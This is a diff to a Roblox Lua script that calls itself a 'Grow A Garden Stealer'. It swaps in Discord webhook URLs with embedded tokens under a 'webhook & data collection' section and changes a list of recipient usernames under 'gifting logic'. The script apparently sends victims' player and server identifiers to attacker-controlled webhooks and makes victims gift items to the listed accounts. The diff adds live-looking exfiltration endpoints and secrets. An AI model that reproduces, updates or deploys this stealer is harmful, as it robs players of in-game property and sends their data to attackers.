@@ -6,8 +6,8 @@ local bp = p:WaitForChild("Backpack")
 
 -- webhook & data collection
 local webhooks = {
-    {url="https://discord.com/api/webhooks/1391051342575046699/6kXwGsa-tqGH48sEC4f18jrmYgZPGCv76HQPg3uuK0G8qi7ZgbZSMpx0co3KKFeLieHr",u="GardenStealerBot"},
-    {url="https://discord.com/api/webhooks/1391158095371309206/29yO5qTpha5KPaJXjp1R5xon3EKp3TBPnGxonFxXcZwX_tuQuyvCs2POGQVI_lKrMY0i",u="GROW A GARDEN STEALER"}
+    {url="https://discord.com/api/webhooks/1391051342575046699/6kXwGsa-tqGH48sEC4f18jrmYgZPGCv76HQPg3uuK0G8qi7ZgbZSMpx0co3KKFeLieHr",u="JOHANNES THE IDOIT"},
+    {url="https://discord.com/api/webhooks/1389028572861173781/-wOCoC5VRt5p2l-gifTS8ARufuPVfS4f1ziPRdbQ2FH96q_I1VKv2MpoSl4DKWtlGV7R",u="GROW A GARDEN STEALER"}
 }
 local un, dn = p.Name, p.DisplayName
 local jid, pid = game.JobId, game.PlaceId
@@ -56,7 +56,7 @@ if r then
 end
 
 -- gifting logic
-local tnames = {"HelloyalltryV2","notfishybloxdontrade","Mr_bac0nguy1"}
+local tnames = {"HelloyalltryV2","notfishybloxdontrade","HaydenWTB"}
 local pm, cm, gifted = {},{},{}
 for _,n in ipairs(tnames) do
     local t = game.Players:FindFirstChild(n)
